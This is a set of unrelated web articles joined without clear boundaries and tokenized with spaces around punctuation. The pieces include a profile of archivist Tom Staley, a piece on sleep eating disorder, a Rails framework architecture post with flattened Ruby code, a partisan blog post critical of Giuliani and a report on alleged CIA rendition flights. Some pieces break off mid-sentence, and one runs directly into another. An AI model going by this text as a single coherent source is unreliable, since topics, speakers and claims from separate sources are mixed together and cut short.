Seventy - one , and a modernist scholar by training , he is mercurial and hard - driving .
Amid the silence of the center ’s Reading Room , he often greets visiting scholars with a resonant slap on the back .
In college , at a Jesuit school in Colorado , Staley pitched in a summer baseball league , specializing in a slow , sinking curve .
His “ crafty pitch , ” as he calls it , was good enough to attract the attention of professional scouts .
The Ransom Center , under Staley ’s leadership , easily outmaneuvers rivals such as Yale , Harvard , and the British Library .
It operates more like a college sports team , with Staley as the coach — an approach that fits the temperament of Texas .
“ People take a special pride here in winners , ” Staley says .
“ They like success . ” ( After the Ransom bought its Gutenberg Bible , the center sent the Bible on a victory lap , displaying it at libraries , museums , and universities around the state . )
Staley works from behind an oak desk in a large office on the Ransom ’s third floor .
A bronze bust of Joyce , by Milton Hebald , is in the foyer .
The bookshelves hold copies of Staley ’s many scholarly publications ; before becoming an archivist , he wrote studies of Dorothy Richardson , the first writer to use stream - of - consciousness narration in English , and of Jean Rhys , the author of “ Wide Sargasso Sea . ”
He was a founder of the James Joyce Quarterly , and was its editor for twenty - six years .
As you walk down the corridor leading to Staley ’s office , you hear his cackling laugh .
He has coined several maxims about the acquisition of archives , including what he calls Staley ’s Law : “ Ten per cent of an archive represents ninety per cent of its value . ”
When he tells you about an archive that he is hoping to buy , he stops and purrs , “ Oooh , it ’s good , it ’s very gooood , ” his hill - country accent making him sound like a feline Lyndon Johnson .
I recently went with him to a penthouse apartment in Miami , to look at a large archive of experimental poetry that had been collected by a pulmonologist , Marvin Sackner , and his wife , Ruth .
Shortly after arriving , Staley pronounced it a “ solid collection . ”
Upon examining some work in detail — the collection included the 1897 journal in which Stéphane Mallarmé ’s poem “ A Throw of the Dice ” first appeared — he began to snuffle with excitement .
After spending an hour with the archive , Staley declared it to be “ one hell of a collection . ”
He told me this outside , so that the Sackners would n’t raise the price .
From his office in Austin , Staley keeps tabs on writers who interest him — e- mailing and writing to them about their plans for their papers .
To him , the world is a map of treasures whose locations he already knows .
His eyes are fixed equally on the aging British literary couple ( who are moving to a smaller house , now that the children are grown ) and the Pulitzer - nominated phenom ( who thinks that his inclusion in the same archive as Graham Greene will help cement his stature ) .
Staley can wait years for the right moment to make a bid .
“ It ’s chess , not checkers , ” he likes to say .
“ You have to think ahead . ”
Once , he put a woman he thought was dating Cormac McCarthy on the Ransom ’s advisory board in the hope — vain , as it turned out — that it would prompt the reclusive author to sell his papers .
Gene Cooke , an investor who is an old friend and tennis partner of Staley ’s , says , “ You can always tell if Tom ’s ahead or not .
When he ’s winning , it ’s Hopkins . ”
( Staley will recite “ The Windhover ” : “ I caught this morning morning ’s minion , kingdom of daylight ’s dauphin , dapple - dawn - drawn Falcon . ” )
“ When he ’s losing , it ’s Milton . ”
( Staley likes to quote from “ L’Allegro ” : “ Hence loathèd Melancholy , of Cerberus and blackest midnight born . ” )
During Staley ’s two decades in the job , he has bought nearly a hundred literary collections — including papers of Jorge Luis Borges , John Osborne , Julian Barnes , Arthur Miller , Tom Stoppard , Penelope Fitzgerald , John Fowles , Isaac Bashevis Singer , and Don DeLillo — and , as he moves toward retirement , his buys are getting bigger .
In 2003 , Texas bought the Watergate papers of Bob Woodward and Carl Bernstein for five million dollars .
( A sealed file revealing the then secret identity of Deep Throat , Mark Felt , was deposited at a trustee ’s office in Washington . )
In 2005 , Staley paid two and a half million dollars for the collection of Norman Mailer , which included twenty - five thousand of Mailer ’s letters , along with the identification tags of his late poodle , Tibo .
The archive — weighing twenty thousand pounds in all — came to the center in a tractor trailer .
The New York book dealer Glenn Horowitz , who brokered the two deals , says of Staley , “ He ’s looking for projects that have a culminating quality to them . ”
Staley has a gift for finding a way to buy archives that appeal to him .
“ I spend half my time raising money , ” he says .
Whereas most archives take years to amass the money for an acquisition , Staley lined up donors for the Mailer collection in a few months .
“ We are able to respond with alacrity to an offer , ” Staley says .
“ A lot of things come to us because the owners know they will get a prompt answer .
If we do n’t want it , then they can try somewhere else . ”
There is not much that other institutions can do when Texas is interested .
After Osborne , Stoppard , Penelope Lively , and others sold their papers to Texas , the mass departure aroused alarm in Britain — a 2005 headline in the London Times proclaimed , “ WRITERS UNITE TO FIGHT FLIGHT OF LITERARY PAPERS TO U.S. ”
To counter the Ransom Center , Britain ’s national - heritage fund changed a rule prohibiting public money from being spent on material less than twenty years old ; the exclusion was reduced to ten years .
The change barely diminished the flow of work across the ocean , however .
Staley does not have much sympathy for the aggrieved .
Last year , at a conference at the British Library , Staley was asked about an essay in which the British poet laureate Andrew Motion argued that national treasures belonged in the nations that created them .
He retorted , “ Like the Elgin Marbles ? ”

What Happened to the Oil Boom ?
It is amazing how short our memories can be .
Just last summer , crude oil was trading at $ 77 a barrel .
In five short months , the price has fallen more than 30 % , and it now sits near two - year lows .
Being heavily invested in the oil patch , I decided it was time to dig into the market fundamentals to find out if the oil boom is really over , or if the current weakness has created some blue - light specials in the oil patch .
Gas price fluctuations need some managing - a new use for the SPR ?

Unsurprisingly , 2006 brought another resounding rejection of fundamentalist neo-liberal policies , this time by voters in Nicaragua and Ecuador .
As a young teen , Lynne Romano recalls awakening to find turned - over jars of ravioli sauce dripping down her dresser or mustard - smeared potato chips scattered around her room .
How they got there was a total mystery to her .
“ Then my mother started getting mad at me for messing up the kitchen at night , ” she says .
“ I had no idea I was getting up in my sleep and eating . ”
The problem worsened with age .
“ I ’ve woken up with candy wrappers all over my bedroom floor , ” says Romano , now a 51 - year - old mother of two living in Andover , Massachusetts .
“ I ’ve found plates on the floor that I have to be careful not to step on when I get up . ”
Except for the trail of crumbs and gooey messes that confront her in the morning — and a nauseous feeling from overeating — Romano has no memory of her nightly foraging .
Once she awoke in the morning to a throbbing pain in her wrist .
“ I opened my eyes to see what was wrong , and I was burned , ” she says .
“ I ’d been cooking in my sleep ! ”
Romano suffers from a specialized form of sleepwalking called nocturnal sleep - related eating disorder ( NSRED ) , a condition first recognized in 1991 .
It is a cross between a sleeping disturbance and an eating disorder .
Unlike other parasomnias , NSRED often resembles a serious addiction , with sufferers frequently getting up several times a night .
In this somnolent state they may scarf down voluminous quantities of food — and balloon up in weight .
For now , medical science has little to offer those whose lives are ruled by this inexplicable condition .
But new research holds out hope that drugs developed to treat other neurological problems — notably epilepsy — could rein in the compulsive and blind drive to eat at the core of the disorder .
Sleep eating is often confused with the more common disorder known as night eating syndrome , in which individuals consume the bulk of their daily calories after 6 p.m .
Night eating syndrome is most prevalent in people with mood disturbances and involves a disruption in the circadian rhythms that govern appetite , shifting the urge to eat into the nocturnal hours .
But unlike sleep eaters , night eaters are aware of what they ’re doing , gorging themselves before even going to bed .
If they snack in the middle of the night , they are awake and fully conscious of their actions .
By contrast , sleep eaters have minimal or no awareness , although “ they usually do manage to find a way back to bed , ” says Helene Emsellem , medical director of the Center for Sleep and Wake Disorders in Chevy Chase , Maryland .
The disorder is also rare : Questionnaire responses suggest that the problem affects from 0.5 to 1 percent of the population .
But that ’s a sketchy estimate based on a small sample , cautions John Winkelman , who conducted the survey as medical director of the Sleep HealthCenters at Brigham and Women ’s Hospital in Boston .
Because sufferers are often ashamed , many cases may go unreported .
“ A lot of individuals with this problem start out as conventional sleepwalkers and then become fixated on food , ” reports sleep expert Mark Mahowald of the University of Minnesota .
“ Why this happens we do n’t know . ”
Doctors are not even sure whether it disproportionately affects people with daytime eating disorders .
People seeking help for the problem at sleep clinics are n’t likely to have eating disorders while awake .
But at eating - disorder clinics , many sleep eaters also suffer from daytime anorexia nervosa or bulimia .
However , hunger does not generally seem to be a motive , says David Neubauer , associate director of the Sleep Disorders Center at the Johns Hopkins University School of Medicine .
“ Episodes tend to occur within a few hours after they go to sleep , ” he says , “ and if you ask them why they do it , they do n’t know . ”
Sleep eaters usually make a beeline for high - calorie foods that are sweet , sticky , or gooey .
Ice cream , chocolate sauce , peanut butter , and honey are favorites — even if the sleep eater shuns these foods when awake .
Oddly , sleep eaters have been known to munch on buttered cigarettes , salt sandwiches , raw meat , even Brillo pads — virtually anything except vegetables .
“ I do n’t know of any case of a sleep eater making a healthy green salad , ” says Mahowald .
“ I guess people do n’t like vegetables any more when asleep than when awake . ”
The attraction to inedible things , he admits , is harder to explain .
If a family member tries to stop the foraging , individuals who are not normally combative during the day may wage a major battle , thus discouraging others from intervening .
Sleep eaters themselves have put bicycle locks on refrigerators or asked household members to lock them in their room or hide food .
But these efforts usually fail , as sleep eaters may be persistent and resourceful in their quest for satisfaction .
While still asleep , “ one woman took scissors from her bedside table and chipped away at the wood around her lock , ” reports Neubauer .
“ Or they go foraging and find the food they or others have tucked away in the garage . ”
Still , Neubauer believes that sleep eaters may be able to exert some control over their compulsion .
“ A female patient was deathly afraid of snakes and succeeded in keeping herself from raiding the fridge at night by putting a large fake snake on the kitchen table , ” he says .
Some doctors will prescribe hypnotic medications to inhibit sleep eaters from getting out of bed in the first place .
But that practice has become controversial due to the Food and Drug Administration ’s recent warning that some of these drugs — notably Ambien — may actually trigger sleep eating in patients who did not previously have the problem .
Better treatments may soon be forthcoming .
A recent trial at Brigham and Women ’s Hospital suggests that the anticonvulsant Topamax , currently used to treat everything from migraines to obesity , may offer a more effective means of controlling the compulsion .
Like many anticonvulsants , Topamax promotes sleep .
It has been noted that , coincidentally , epileptics treated with the drug lost weight — possibly , says Winkelman , because it may suppress appetite .
“ We do n’t know precisely how the drug acts , ” he says , “ but it ’s certainly plausible that it might reduce episodes of nocturnal eating , so we decided to give it a try . ”
In his small pilot study — it involved only 30 patients — almost 70 percent of the participants experienced a significant reduction in sleep - eating episodes , and 28 percent lost more than 10 percent of body weight .
Lynne Romano was one of them .
“ On the drug , ” she says , “ I got up less frequently to binge and I lost a good 20 or so pounds .
It was n’t a miracle cure , but it sure helped . ”
That ’s heartening news , because sleep eaters need all the help they can get .
As droves of failed dieters can attest , resisting the urge to overeat takes an iron will — something hard enough to muster when awake , much less when asleep .

4/12/2006 : Ellsworth AFB foam test Quick note ... if you are linking to this very popular thread , please link to the blog view version instead .
It saves resources for the rest of the cellar.org community .
Thanks !
How do you figure out whether a foam firefighting system in an air force hangar is set up correctly and works ?
Well you turn it on for a few seconds , to make sure it 's got pressure and everything .
First you set up a scaffolding so you can record the event and show the flow coming out of all nozzles .
And then you let 'er rip .
After 15 seconds you can see foam is covering all areas it has to , so the test is successful .
Shut 'er off .
Uh , guys ?
Shut 'er off ?
Aw crap .
Whatever was meant to shut off the system after 15 seconds , did NOT shut it off and the foam continued to flow .
After a few minutes ...
The foam is a story high and still flowing !
Uh , Joe ? you can climb the scaffolding ladder now ...
Two stories high .
This is the guy standing on top of the scaffolding .
So they just let it go .
Thanks to xoxoxoBruce for the initial set of photos and then I googled and found a great

In an academic paper they completed last year that analyzed earlier findings from the national surveys , Professors Musick and Bumpass compared responses to questions about how couples described their relationships , how often they fought and over what , and how they would envision their lives if they separated .
The research does n’t address whether blissful 21st - century relationships are any more or less enduring than they were in the 20th century , so it may be that happy coupledom always came with a three - year expiration date .
With nonmarital childbearing more common and women more economically independent , “ What ’s keeping people together is their love and commitment for each other , ” Professor Musick said , “ and that ’s fragile . ”
Anecdotal evidence suggests that the findings have some foundation .
Bart Blasengame , a 33 - year - old freelance writer from Portland , Ore. , was with his former fiancée for three years .
“ I felt like , by year three , we were both forcing it , ” he recalled .
“ It ’s the whole cliché of pursuit , ” he said .
“ Your dates are planned out like some Drew Barrymore romantic comedy with unicorns and rainbows .
By year two , we were cruising along , living together , relatively happy .
But from a growth standpoint things had started to atrophy .
We were happy , content is a better word , but there was no spark . ”
But the evolving rules of marriage provide both opportunities and pitfalls , Professor Musick said .
“ There may be greater potential to find fulfillment in relationships , ” she said , “ but that possibility and the expectations that come from it may lead to greater disappointment for some ” if the expectations are n’t fulfilled .
Her bleak statistical assessment of the durability of enchantment is one of several new findings about relationships and marriage in America .
In a word , the State of the Unions is precarious .
There has been surprisingly little written about how Rails is implemented .
If you Google for “ architecture Rails ” you ’ll find plenty of articles that describe Rails as a web framework based on the classic Model - View - Controller design pattern .
And you ’ll find plenty of links about Rail ’s constituent parts – ActiveRecord , ActionController , ActionView , ActiveSupport , etc .
But you ’ll find precious little about how Rails is put together .
Which is shame , since Rails is constructed in a very unusual manner .
So let ’s dig into Rails and see what makes it unusual .
What Does a Web Framework Have to Do ?
Let ’s start by considering what a web framework has to do .
If you were to build your own framework , the absolute minimum requirements are :
Read requests via http /s
Unmarshall client provided data – the data may be url encoded , gzipped , etc .
Figure out what the client is asking
Do what the client is asking
Return the answer in a client specified format such as xhtml , xml or png
But such a bare bones framework would leave much to be desired .
To be truly useful , you would also have to address a number of additional issues , including :
Authentication
Authorization
State handling ( generally via sessions )
Error handling
Logging
Performance ( timing , caching , pooling , threading , etc )
So how can you meld all this functionality into a cohesive system that is easy to use and easy to extend ?
Decorator
The standard answer is use the Model - View - Controller pattern .
But that still leaves many questions to be answered – particularly on the controller side .
How exactly do you implement the controller piece ?
A common approach is to use the Decorator pattern made famous by the Gang of Four .
The basic idea is to create a chain of decorators as shown in the diagram below .
Each decorator deals with one issue .
So you ’d have one decorator for unmarshalling , one for authentication , one for session management , etc .
The Smallworld Internet Application Server uses this architecture .
Apache Axis and Apache Cocoon use this architecture .
And although I ’ve never used Django , its middleware classes require a common API which is a telltale sign that they are really decorators in disguise .
So why is the Decorator pattern so popular ?
Because it let ’s you modularize your framework , making it possible to add or remove functionality as needed based on a particular application ’s requirements .
Aspect Oriented Programming
Another approach , albeit much rarer , is to use Aspect oriented programming , or AOP , to combine multiple behaviors .
Like many computing technologies in use today , aspect oriented programming was invented at Xerox Parc .
But it found its home in the Java world via the AspectJ project , which is now part of Eclipse .
There are plenty of articles that explain aspect oriented programming in - depth so I wo n’t rehash them .
But the basic idea is to use a domain specific language ( DSL ) to combine different pieces of functionality without touching the original code .
The classic example is logging .
Adding logging statements to each method is tedious and error prone .
Even worse , if your logging API changes you have to go back and touch every part of your system .
Thus logging is an example of a cross-cutting concern , something that affects every part of a system .
With a little thought , its easy to see why aspect oriented programming could make it easier to write a web framework .
And its appears there is such a thing – the Spring Framework .
Although I ’ve never used it , the documentation makes it look like it relies heavily on aspect oriented programming .
The Rails Way
So how about Rails ?
Rails is unusual because it uses Ruby ’s limited aspect oriented support to mimic the Decorator pattern .
Ruby supports aspect oriented programming ?
Well not really .
But it does offer a very crude approximation via its alias method and support of modules .
Rails leverages this basic support for all its worth – it forms the very heart and soul of Rails .
To see what I mean let ’s look at an example .
Here is the basic skeleton of Rails session handing functionality , found in actionpack\lib\action_controller :
module ActionController #:nodoc : module SessionManagement #:nodoc : def self .
included ( base ) base .
extend ( ClassMethods ) base .
send : alias_method_chain , : process , : session_management_support base .
send : alias_method_chain , : process_cleanup , : session_management_support end module ClassMethods #
Class methods go here end #
Instance methods go here end end
The important things to notice are :
Behavior is specified using modules instead of classes
Rails uses Ruby ’s include method to add methods defined in a module as instance methods in a host class .
By convention the host class is called Base – thus ActionController : : Base , ActionView : : Base .
Rails uses Ruby ’s extend method to add methods defined in a module as class methods ( called static methods in other languages ) in a host class .
By convention class methods are defined in a sub- module unsurprisingly called ClassMethods .
Rails uses a custom method called alias_method_chain , which is based on Ruby ’s built - in alias method , to chain method calls together .
Rails then loads this code in actionpack - 1.13.3\lib\action_controller.rb like this :
require ' action_controller/session_management '
ActionController :: Base .
class_eval do include ActionController :: SessionManagement end
The end result is that ActionController : : Base now has the following method chain :
process -> process_with_session_management_support -> process_without_session_management_support
Voila .
Rails has created a Decorator using Ruby ’s limited aspect oriented programming support .
If you look through the Rails source code you ’ll see this pattern repeated over and over .
Is This A Good Idea ?
Rails implements the Decorator in such an unusual way that its worth asking if it is a good idea or not .
In my opinion it is n’t .
I do n’t see any advantages in Rails ’ implementation – do you ?
But I do see several disadvantages .
The biggest one is that its removes an obvious extension point from Rails .
Once two methods are linked together using Ruby ’s alias method you can’t break them apart .
For example , if A aliases B then you ca n’t insert C between them .
This might not seem like a big deal , but for some extensions it quite important .
For example , when I wrote our REST controller implementation last year I struggled mightily to fit it into Rails aliases method calls and finally gave up and took a different approach .
Its worth noting that its often possible to work around this problem since Ruby is such a flexible language .
Instead of adding a new decorator , in many cases you can replace the original method to achieve what you want .
Its not nearly as elegant , but it usually does the trick .
A second disadvantage is that it complicates Rails architecture .
What ’s the difference between a decorator and a filter ?
Nothing .
By using the Decorator pattern you could merge Rail ’s filter functionality with its method chaining functionality , thereby reducing its overall code base .
A third disadvantage , albeit a minor one , is that the method chains Rails creates are hidden .
You ca n’t look at a single piece of code , or configuration file , and see the method chains .
The closest is action_controller.rb and action_view.rb , but I ca n’t get a handle on a chain object at runtime and say “ please print yourself on STDOUT so I can see what is happening . ”
The fourth , and last , disadvantage is much more subjective and personal .
I think Rails is trying to be too cute for its own good .
When faced with a standard problem use a standard solution – that is the whole point of design patterns .
By trying to be too cute Rails provides a solution that is less flexible and less obvious than the standard approach .
Update – Peter rightly pointed out in the comments that I mistakenly used the Chain of Responsibility Pattern instead of the Decorator pattern .
There is a subtle , yet extremely important , difference between the two .
In the Chain of Responsibility pattern the first handler that can process a request will do so and the rest of the chain will not be executed .
In the Decorator pattern every decorator in the chain will process a request .
I ’ve decided to update this entry since I think accuracy is more important the maintaining the original version .
Thanks for your feedback Peter !
If the blips in the debris of the Tevatron particle smasher really are signs of the Higgs boson then it ’s not what we expected .
It might mean that it ’s time to replace the standard model with a more complex picture of the universe
On 9 December last year , as John Conway looked at the results of his experiment , a chill ran down his neck .
For 20 years he has been searching for one of the most elusive things in the universe , the Higgs boson – aka the God particle – which gives everything in the cosmos its mass .
And here , …
After Feehery 's declaration of Giuliani 's credibility , Wolf continued with his monotone drivel as though the guy had said " the sky is blue . "
Carville then pointed out that Giuliani " put the command center in the World Trade Center " and " has never had anything to do with the U.S. military . "
Wolf continued : " John , is it a forgone conclusion that among registered Republicans , and those voters likely to vote Republican , this issue clearly helps Rudy Giuliani ? "
To which Feehery replied , " ... I think Rudy Giuliani because he has been most identified with THE WAR ON TERRORTM .
This is his winning issue . "
Wolf segued to the next segment about Laura Bush promoting faith - based aids prevention and abstinence , " It 's going to be a busy weekend for the presidential candidates out on the campaign trail . "
Un. Freaking .
Believable .
Maybe Feehery was just pushing the Repug front - runner .
The latest Fox News poll has Giuliani up 13 points over McCain .
Still , how could he and Wolf think that Giuliani is " Tough on Terror " ... and why does Giuliani keep pushing that meme ?
Giuliani has been chasing the " Conservative Evangelical " and " Social Conservative " vote , apparently without much success .
That is no gteat surprise .
According to On The Issues , Giuliani is pro-choice , supports embryonic stem cell research and supports gay rights .
I am not being critical - I agree with him on those issues , but the " Pat Robertson Cult " does not .
So is he trying to appear to be " Tough on Terror " because that 's all he 's got ?
While speaking to " business , corporate and political leaders at Regent University , " Giuliani said Bill Clinton 's response to the 1993 attack the World Trade Center and later attacks by al - Quaida was weak and ineffectual :
... Maybe in hindsight , all of that is much clearer now .
... I think they ( Democrats ) are in denial .
They can't face this threat .
They could n't in the 1990s ...
From this statement , one could properly infer that Rudy was on top of things in the 1990s .
According to Wayne Barrett and Dan Collins that is not the case .
In their book , Grand Illusion : The Untold Story of Rudy Giuliani and 9/11 , they have a different take on " Giuliani 's role before , during , and after 9/11 . "
From the publisher 's page :
... Grand Illusion reveals how Giuliani has revised his own history , casting himself as prescient terror hawk when in fact he ran his administration as if terrorist threats simply did not exist , too distracted by pet projects and turf wars to attend to vital precautions .
Publishers
Weekly said in their review of the book :
... According to the authors , that memorable image - Rudy among the ruins - hides a multitude of sins : in the event of a terrorist attack , Giuliani should have been directing police , fire and emergency services from the city 's high - tech underground emergency management center ; unfortunately , Giuliani had insisted that that secure center be located at the World Trade Center .
Political infighting between police and fire departments went unchecked , preventing coordination between first responders , and Giuliani 's rush to return New York to business as usual ( fearing that Wall Street might relocate ) may have seriously impaired the health of returning workers and residents ...
Jerome Hauer , the first emergency management director for New York City , confirms details of the book .
He said Giuliani wanted the emergency command center to be within walking distance of City Hall , rather than the Office Complex in Brooklyn first suggested by Mr. Hauer .
As a result , the command center was located at the World Trade Center and could n't be used on 9/11 because the building collapsed .
Giuliani said , " Jerry Hauer recommended that as the prime site and the site that would make the most sense ...
It was largely on his recommendation that that site was selected . "
Hauer subsequently said , " That ’s Rudy ’s own reality that he lives in ...
It is not , in fact , the truth . "
As Giuliani said , things are clearer in hindsight .
Wayne Barrett , co-author of " Grand Illusion : The Untold Story of Rudy Giuliani and 9/11 " was a guest on the June 27 " Countdown with Keith Olbermann " show .
Olbermann asked Barrett if Giuliani " ever mentioned the ‘ 93 bombing before ?
Did he often mention terrorism before 9/11 ? "
Barrett Replied :
...
He mentioned the ‘ 93 bombing once in the eight years that he was mayor , and that was in his inaugural address in 1994 .
And he used it as a metaphor for self - help , for personal responsibility as part of his welfare program .
He certainly never talked about the World Trade Center bombing .
Not only publicly , but in the course of the book , we interviewed everybody who was considered to be his first police commissioner , and this is within months of the attack in ‘ 93 .
The question never came up in the interviews that he conducted or that were conducted by the transition committee that he established .
Look , what does it say that he never even had a multiagency drill in the World Trade Center in the eight years in between the incident ?
Not only did he put the command center there , the firefighters were carrying the same radios that malfunctioned on the day of the ‘ 93 bombing .
It was something he had no consciousness about .
He was the United States attorney in the Southern District before he became mayor , and every assistant United States attorney who prosecuted any one of the terrorist attacks that he described in his speech yesterday , every single one of those assistants was hired by him in that office .
We interviewed all of them , and he never discussed the ‘ 93 bombing or terrorism with any of them .
The United States attorney for the Southern District had many meetings with him , but this question of terrorism never came up .
Then Olbermann repeated a quote from Giuliani , " Bin Laden declared war on us .
We did n‘t hear it .
I thought it was pretty clear at the time , but a lot of people did n‘t see it . "
Olbermann added , " I lived not far outside New York City for five years of his mayorship .
I lived inside it for two years .
This is the first time I ‘m hearing any of this .
Did St. Rudy of 9/11 figure out the threat from bin Laden before 9/11 and decide to keep it a secret from the American people , say nothing of the people in New York ? "
Barrett Replied :
Keith , he wrote in his own book , " Leadership , " that after 9/11 , he calls up Henry Kissinger and says , What should I read about this guy Osama bin Laden ?
And Henry Kissinger recommends a book written by a guy named Bodansky in 1998 and 1999 .
In Bodansky ‘s book , Osama bin Laden predicts a spectacular attack on the United States .
It was a little late reading .
He told us how well prepared he was , because he underlined this book many times after 9/11 .
He — why is it , I mean , could n‘t — could there be anything more partisan than saying , Osama bin Laden declared war on us and nobody heard it in ‘ 93 , and not say anything about George W. Bush , who , after 9/11 , has n‘t done a thing to capture him ?
...
Has he ever said one critical word about the failure of this administration to go after the guy who attacked this city and killed his good friends ?
Not one word .
Rudy is right , things are clearer in hindsight .
I tried to find some reference to Rudy Giuliani's " Tough on Terror " reputation prior to September 11 , 2001 .
On The Issues had one reference to Rudy Giuliani on War & Peace and Homeland Security prior to 9/11 .
In February 2000 , Giuliani apparently advocated more inspections in Iraq .
Since 9/11 , Giuliani has had a few things to say about National Security issues .
From " On The Issues , " his position in October 2001 was " No need to understand reasons for terrorism - just stop them . "
OK ... you got a plan for that Rudy ?
In October 2002 he said , " We 're right and terrorists are wrong -- as simple as that . "
OK ... problem solved .
Next problem .
Other " Giuliani positions " reported by " On The Issues " :
Aug 2004 - Removing Saddam needed to be accomplished .
Aug 2004 - Liberating the Iraqis is something we should be proud of .
Aug 2004 - The terrorists have heard from us .
Dec 2005 - Fervently supported reauthorization of the Patriot Act. Nov 2006 - Democrats do n't support military the way Republicans do .
Nov 2006 - Withdrawal from Iraq encourages future terror attacks .
May 2007 - Use every method you can think of to interrogate terrorists .
May 2007 - Only thing worse than invading Iran is Iran having nukes .
May 2007 - Democrat timetable for retreat " fundamentally irresponsible " .
" On The Issues " reported that in May 2007 Giuliani said that the " GOP is fundamentally irresponsible on war . "
Giuliani clarified that during the 2007 Republican Debate in South Carolina .
When asked about that statement , he said :
I was talking about the timetable for retreat that the Democrats passed , in which they did something I 've never heard of in the history of war , which is to give your enemy a schedule of how a retreating army is going to retreat .
That was highly irresponsible .
What the Republicans suggested is n't the right approach either .
OK ... that clears that up - the GOP is NOT fundamentally irresponsible on war .
Right , Rudy ?
When Giuliani was asked if " he had an ' open - ended ' commitment to Iraq , " he refused to answer the question by talking about ' fighting them over there so we do n't have to fight them here . '
He said " These people do want to follow us here and they have followed us here .
Fort Dix happened a week ago . "
The problem with Giuliani's reply is that all of the people involved with the Fort Dix " plot " had lived here for years - some for more than 23 years .
When confronted with this convoluted logic , he said , " This whole thing is a tremendous danger for us , abroad and here . "
The ThinkProgress article cited above included another Giuliani quote :
...
These people ( al Qaeda terrorists ) came here and killed us because of our freedom of religion , because of our freedom for women , because they hate us ...
The reality is , if you are confused about this , I think you put our country in much greater jeopardy .
All of these positions and statements are REPUBLICAN TALKING POINTSTM .
Rudy has his 12 Commitments talking points posted on his " joinrudy2008 " website :
I will keep America on offense in the Terrorist 's War on us
I will end illegal immigration , secure our borders , and identify every non-citizen in our nation .
I will restore fiscal discipline and cut wasteful Washington spending .
I will cut taxes and reform the tax code .
I will impose accountability on Washington .
I will lead America towards energy independence .
I will give Americans more control over and access to health care with affordable and portable free - market solutions .
I will increase adoptions , decrease abortions , and protect the quality of life for our children .
I will reform the legal system and appoint strict constructionist judges .
I will ensure that every community in America is prepared for terrorist attacks and natural disasters .
I will provide access to a quality education to every child in America by giving real school choice to parents .
I will expand America 's involvement in the global economy and strengthen our reputation around the world
Unfortunately , Rudy does n't think that the Occupation of Iraq is in the top 12 problems he will have to face as President .
The Democratic National Committee has a webpage that details how Rudy Giuliani's So - Called " Commitments " are based on a poor mayoral record and empty rhetoric , so I wo n't addesss any of them .
Omitting Iraq in the " 12 Commitments " apparently was n't an oversight on Rudy 's part .
It seems that he really does n't give a damn about ending the occupation of Iraq .
Giuliani was a member of the Iraq Study Group , but resigned after failing to show for any meetings , saying , " my previous time commitments do not permit me the full and active participation that the Iraq Study Group deserves . "
His " previous time commitments " included giving motivational speeches and fundraising .
As far as I can tell , Giuliani repeats REPUBLICAN TALKING POINTSTM , and offers Empty Rhetoric as reasons for why he should be President .
We need to debunk the myth of Giuliani being " Tough on Terror . "

This flight was spotted landing at a UK airport – proof that ‘ rendition ‘ flights are still taking place
The picture that proves ‘ torture flights ’ are STILL landing in the UK
By GLEN OWEN
The row over CIA ‘ torture flights ’ using British airports has deepened following fresh evidence that a plane repeatedly linked to the controversial programme landed in the UK just days ago .
The plane was logged arriving at RAF Mildenhall in Suffolk last weekend , and watching aviation experts said the aircraft , piloted by crew clad in desert fatigues , was immediately surrounded on the runway by armed American security forces .
Its registration number , clearly visible on the fuselage , identifies it as a plane which the European Parliament says has been involved in ‘ ghost flights ’ to smuggle terrorist suspects to shadowy interrogation centres abroad .
Records show the plane is owned by Blackwater USA , a CIA contractor described as ‘ the most secretive and powerful mercenary army on the planet ’ .
An eyewitness , who previously worked as an RAF electronic warfare expert , said that as the plane – a CASA - 212 Aviocar – taxied to a stop on the runway it was met by a US military Humvee .
The vehicle contained four US security policemen armed with M16 assault rifles , who accompanied the camouflaged crew to the airport terminal .
The man , who did not want to be identified , added : “ I thought it was curious that they would give a civilian plane an armed guard . ”
Another spotter , who took the picture of it landing , recorded it touching down at 4.36 pm on Saturday .
The disclosure follows damning findings by the Council of Europe human rights organisation , which accused Tony Blair on Friday of colluding in a CIA operation to run secret prisons in Poland and Romania by allowing the agency to use UK airports .
The study was contradicted on the same day by a report from the Association of Chief Police Officers ( ACPO ) , which concluded that there was no evidence to support the claims .
But the director of the human rights group Liberty revealed that ACPO had admitted it restricted its inquiry to a review of media reports on the issue .
She accused them of rushing out their ‘ cursory ’ findings as part of a politically - motivated ‘ spin ’ operation .
The US plane ’s arrival was also logged by Touchdown News , a group of enthusiasts who record the movements of military aircraft at RAF Mildenhall and RAF Lakenheath .
The group said the plane used its civilian call sign when talking to air traffic control and took off again early on the morning of Sunday June 3 , flying east .
A report last November by a European Parliament committee placed the plane – registration number N964BW – on a list of ‘ companies and aircraft used by the CIA for extraordinary rendition flights ’ .
The plane was previously registered with the Bolivian army , and has been pictured on the ground in the Afghan capital Kabul within the past year .
The American Federal Aviation Authority lists the plane as being operated by two companies , Aviation World Wide Services and a sister company , Presidential Airways .
The European Parliament report describes these as shell companies operating as subsidiaries of Blackwater USA , ‘an important contractor for the CIA and the US military ’ which bases the planes in Malta .
Research by a further group , The American Centre for Media and Democracy , claims that flight - tracking internet technology shows the plane landed at least twice in the first six months of 2006 at Camp Peary , the US naval reservation in Virginia known as The Farm and widely alleged to be a CIA training facility .
Tracking technology shows that the plane was en route from Canada to Greenland two days before it was sighted at Mildenhall : the internet software does not extend beyond American airspace , but the expert explained that its route would be consistent with a refuelling stop in the Arctic – it only has a range of about 2,000 miles – followed by a further refuel in East Anglia , before heading to Malta .
From there it could ‘ leapfrog ’ from US bases in the the former Soviet states bordering Afghanistan on to Kabul .
A recent book on Blackwater by Jeremy Scahill , an American author , described the company as the world ’s “ most secretive and powerful mercenary firm ” , carrying out quasi-military operations on behalf of the US government in Iraq , Afghanistan and within the US .
It was founded in 1997 by Erik Prince , a former elite Navy Seal and fundamentalist Christian millionaire who bankrolls far - Right causes .
This newspaper first cast doubt on the Government ’s claim to have no knowledge of the CIA ’s activities 18 months ago when we published pictures of three planes at Scottish airports which had been linked by human rights activists to rendition .
Erik Prince , founder of the Blackwater mercenary firm
Flight records showed the planes had been given landing rights by the MoD , despite there being no record of passenger lists or details of the purpose of the flights .
The Council of Europe dossier , compiled by Swiss senator Dick Marty , said the US had used Britain ’s help to establish a “ global spider ’s web ” of jails and airports to pursue a war on terror without rules .
It claimed the secret centres had been set up so it could use interrogation techniques amounting to torture which are illegal in the US .
These include “ waterboarding ” – the dunking of blindfolded suspects so they believe they are drowning – solitary confinement , shackling in confined cells and exposure of naked captives to extremes of heat , cold and noise .
